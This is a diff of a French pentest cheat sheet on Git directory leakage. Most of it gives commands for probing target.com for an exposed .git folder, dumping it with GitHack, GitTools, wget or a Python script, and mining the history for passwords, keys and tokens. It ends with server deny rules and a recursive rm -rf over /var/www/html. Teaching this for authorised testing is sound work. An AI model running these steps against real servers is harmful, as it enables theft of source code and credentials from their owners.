@@ -4,62 +4,285 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 🗂️ Git Directory Leakage
+# 📁 Git Directory Leakage - Cheat Sheet
 
-## Qu'est-ce que le Git Directory Leakage ?
+## 🎯 Vue d'ensemble
+La fuite de répertoires Git permet d'accéder à des informations sensibles, du code source, des credentials et des historiques de développement via des répertoires Git exposés sur les serveurs web.
 
-Le **Git Directory Leakage** désigne l'exposition accidentelle du répertoire `.git` d'un projet web, permettant à un attaquant de récupérer l'historique complet du code source, des mots de passe ou des clés sensibles.
+---
 
-## 🎯 Objectifs pédagogiques
+## 🔍 Détection et Énumération
 
-- Comprendre les risques liés à l'exposition du dossier .git
-- Savoir comment un attaquant peut exploiter cette fuite
-
-## 📋 Exemples de vulnérabilités et exploitation
-
-### Vulnérabilités courantes
-
-- **Déploiement du dossier .git en production** : Le répertoire .git est accessible via le web.
-- **Absence de restriction sur les fichiers cachés** : Les fichiers comme `.git/config`, `.git/HEAD` sont téléchargeables.
-
-### Scénario d'exploitation
-
-1. **Téléchargement du dossier .git** :
-   - L'attaquant télécharge le dossier .git avec des outils automatisés.
-   - Exemple avec GitTools :
-
+### Identification des Répertoires Git
 ```bash
-gitdumper.sh http://victime.com/.git/ ./repo_recupere
+# Test d'accès direct aux répertoires Git
+# Pourquoi : Vérifier si les répertoires Git sont accessibles via HTTP
+curl -I http://target.com/.git/
+curl -I http://target.com/.git/config
+curl -I http://target.com/.git/HEAD
+
+# Test avec ffuf
+# Pourquoi : Automatiser la recherche de répertoires Git
+ffuf -u http://target.com/FUZZ -w git-paths.txt -mc 200,403
+ffuf -u http://target.com/.git/FUZZ -w git-files.txt -mc 200
 ```
 
-2. **Extraction de fichiers sensibles** :
-   - L'attaquant récupère les fichiers de configuration, mots de passe, clés API, etc.
-   - Exemple pour lister les fichiers :
-
+### Énumération des Fichiers Git
 ```bash
-cd repo_recupere
-git log --oneline --stat
-git show <commit>
+# Fichiers Git essentiels
+# Pourquoi : Identifier les fichiers Git les plus importants
+.git/config
+.git/HEAD
+.git/index
+.git/logs/HEAD
+.git/logs/refs/heads/master
+.git/objects/
+.git/refs/heads/
+.git/refs/tags/
 ```
 
-3. **Récupération d'un mot de passe oublié** :
-   - Recherche dans l'historique :
+---
 
+## 🛠️ Outils d'Exploitation
+
+### GitHack
 ```bash
-git grep password
+# Installation de GitHack
+# Pourquoi : Outil spécialisé pour l'exploitation de répertoires Git
+git clone https://github.com/lijiejie/GitHack.git
+cd GitHack
+python GitHack.py http://target.com/.git/
+
+# Utilisation de GitHack
+# Pourquoi : Récupérer automatiquement tout le repository
+python GitHack.py http://target.com/.git/ /path/to/output/
 ```
 
-## 🛡️ Bonnes pratiques
+### GitTools
+```bash
+# Installation de GitTools
+# Pourquoi : Suite d'outils pour l'exploitation Git
+git clone https://github.com/internetwache/GitTools.git
+cd GitTools
 
-- Ne jamais déployer le dossier .git sur un serveur de production
-- Utiliser un fichier .gitignore adapté
-- Scanner régulièrement les serveurs web pour détecter les fuites
+# Extraction avec GitTools
+# Pourquoi : Extraire les fichiers Git de manière structurée
+./gitdumper.sh http://target.com/.git/ /path/to/output/
+./extractor.sh /path/to/output/ /path/to/extracted/
+```
 
-## 📚 Ressources utiles
+### Custom Scripts
+```python
+#!/usr/bin/env python3
+# Script de récupération Git
+# Pourquoi : Automatiser la récupération de fichiers Git
 
-- [OWASP - GitHub Security](https://owasp.org/www-community/vulnerabilities/Git_Repository_Information_Leakage)
-- [GitTools](https://github.com/internetwache/GitTools)
-- [GitHack](https://github.com/BugScanTeam/GitHack)
+import requests
+import os
+
+def download_git_file(base_url, file_path):
+    url = f"{base_url}/{file_path}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
+        return True
+    return False
+```
+
+---
+
+## 🎯 Techniques d'Exploitation
+
+### Récupération du Repository
+```bash
+# Récupération manuelle des fichiers essentiels
+# Pourquoi : Récupérer les fichiers de base pour comprendre la structure
+wget http://target.com/.git/config
+wget http://target.com/.git/HEAD
+wget http://target.com/.git/index
+
+# Récupération des objets Git
+# Pourquoi : Récupérer les objets pour reconstruire l'historique
+wget -r http://target.com/.git/objects/
+wget -r http://target.com/.git/refs/
+```
+
+### Reconstruction du Repository
+```bash
+# Initialisation d'un nouveau repository
+# Pourquoi : Créer un repository local pour analyser les données
+git init
+git remote add origin http://target.com/.git/
+
+# Récupération des branches
+# Pourquoi : Récupérer toutes les branches du repository
+git fetch origin
+git branch -r
+
+# Checkout des branches
+# Pourquoi : Accéder aux différentes branches
+git checkout -b master origin/master
+git checkout -b develop origin/develop
+```
+
+### Analyse des Données
+```bash
+# Analyse de l'historique Git
+# Pourquoi : Examiner l'historique des commits pour des informations sensibles
+git log --oneline
+git log --stat
+git log -p
+
+# Recherche de fichiers sensibles
+# Pourquoi : Trouver des fichiers contenant des informations sensibles
+git log --all --full-history -- "*.env"
+git log --all --full-history -- "*.config"
+git log --all --full-history -- "*.key"
+```
+
+---
+
+## 🔍 Extraction d'Informations
+
+### Credentials et Configuration
+```bash
+# Recherche de fichiers de configuration
+# Pourquoi : Trouver des fichiers contenant des credentials
+find . -name "*.env" -o -name "*.config" -o -name "*.ini"
+find . -name "config.php" -o -name "database.yml" -o -name ".env"
+
+# Recherche de credentials dans l'historique
+# Pourquoi : Trouver des credentials dans les commits précédents
+git log -p | grep -i "password\|secret\|key\|token"
+git log -p | grep -i "api_key\|access_token\|private_key"
+```
+
+### Code Source Sensible
+```bash
+# Recherche de code source
+# Pourquoi : Analyser le code source pour des vulnérabilités
+find . -name "*.php" -o -name "*.py" -o -name "*.js"
+find . -name "*.java" -o -name "*.rb" -o -name "*.go"
+
+# Recherche de commentaires sensibles
+# Pourquoi : Trouver des informations dans les commentaires
+grep -r "TODO\|FIXME\|HACK" .
+grep -r "password\|secret\|admin" .
+```
+
+### Historique des Commits
+```bash
+# Analyse des commits récents
+# Pourquoi : Examiner les modifications récentes
+git log --oneline -10
+git show <commit_hash>
+
+# Recherche de commits avec des informations sensibles
+# Pourquoi : Trouver des commits contenant des données sensibles
+git log --all --grep="password"
+git log --all --grep="secret"
+git log --all --grep="key"
+```
+
+---
+
+## 🔧 Post-Exploitation
+
+### Analyse des Branches
+```bash
+# Liste des branches
+# Pourquoi : Identifier toutes les branches du repository
+git branch -a
+git branch -r
+
+# Analyse des branches de développement
+# Pourquoi : Examiner les branches de développement pour des informations sensibles
+git checkout develop
+git log --oneline
+git diff master..develop
+```
+
+### Extraction des Tags
+```bash
+# Liste des tags
+# Pourquoi : Identifier les versions taguées du repository
+git tag -l
+git show-ref --tags
+
+# Analyse des tags
+# Pourquoi : Examiner les versions spécifiques
+git show v1.0.0
+git diff v1.0.0..v1.1.0
+```
+
+### Recherche de Fichiers Supprimés
+```bash
+# Recherche de fichiers supprimés
+# Pourquoi : Trouver des fichiers supprimés qui peuvent contenir des informations sensibles
+git log --all --full-history --name-status
+git log --all --full-history --name-only --pretty=format:
+
+# Récupération de fichiers supprimés
+# Pourquoi : Récupérer des fichiers supprimés
+git show <commit_hash>:<file_path>
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Configuration Serveur
+```apache
+# .htaccess pour bloquer l'accès aux répertoires Git
+# Pourquoi : Empêcher l'accès aux répertoires Git via HTTP
+<DirectoryMatch "^/.git/">
+    Order Deny,Allow
+    Deny from all
+</DirectoryMatch>
+
+# Configuration nginx
+# Pourquoi : Bloquer l'accès aux répertoires Git avec nginx
+location ~ /\.git {
+    deny all;
+    return 404;
+}
+```
+
+### Bonnes Pratiques
+```bash
+# Suppression des répertoires Git en production
+# Pourquoi : Supprimer les répertoires Git des serveurs de production
+find /var/www/html/ -name ".git" -type d -exec rm -rf {} +
+
+# Configuration Git pour exclure les fichiers sensibles
+# Pourquoi : Configurer .gitignore pour exclure les fichiers sensibles
+echo "*.env" >> .gitignore
+echo "config.php" >> .gitignore
+echo "*.key" >> .gitignore
+```
+
+### Surveillance
+```bash
+# Surveillance des accès aux répertoires Git
+# Pourquoi : Détecter les tentatives d'accès aux répertoires Git
+tail -f /var/log/apache2/access.log | grep "\.git"
+grep -i "\.git" /var/log/nginx/access.log
+
+# Surveillance des fichiers sensibles
+# Pourquoi : Détecter les modifications de fichiers sensibles
+auditctl -w /var/www/html/.git -p wa -k git_access
+```
+
+---
+
+## 📚 Ressources
+
+- **GitHack** : https://github.com/lijiejie/GitHack
+- **GitTools** : https://github.com/internetwache/GitTools
+- **HackTricks Git** : https://book.hacktricks.xyz/pentesting-web/pentesting-web-methodology/git
+- **OWASP Git** : https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deploy_Management_Testing/03-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information
 
 ---
 
